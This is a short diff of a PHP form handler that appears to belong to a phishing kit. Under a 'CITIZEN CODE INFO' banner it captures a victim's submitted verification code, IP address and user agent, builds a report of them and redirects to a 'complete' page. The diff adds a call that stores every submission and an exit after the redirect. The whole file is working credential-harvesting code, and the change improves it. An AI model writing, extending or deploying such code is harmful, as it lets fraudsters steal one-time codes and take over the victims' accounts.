@@ -8,6 +8,8 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     $useragent = $_SERVER['HTTP_USER_AGENT'];
     $ip = getenv("REMOTE_ADDR");
 
+    h4z3_store_submission('code', $_POST);
+
             $body  = "++++++++++ 🐱‍💻 CITIZEN CODE INFO 🐱‍💻 ++++++++++\r\n";
             $body .= "Verification Code : $code\r\n";
             $body .= "|--------------- I N F O | I P -------------------|\r\n";
@@ -43,5 +45,6 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
         }
 
      header('Location: ../complete');
+     exit;
 }
 ?>
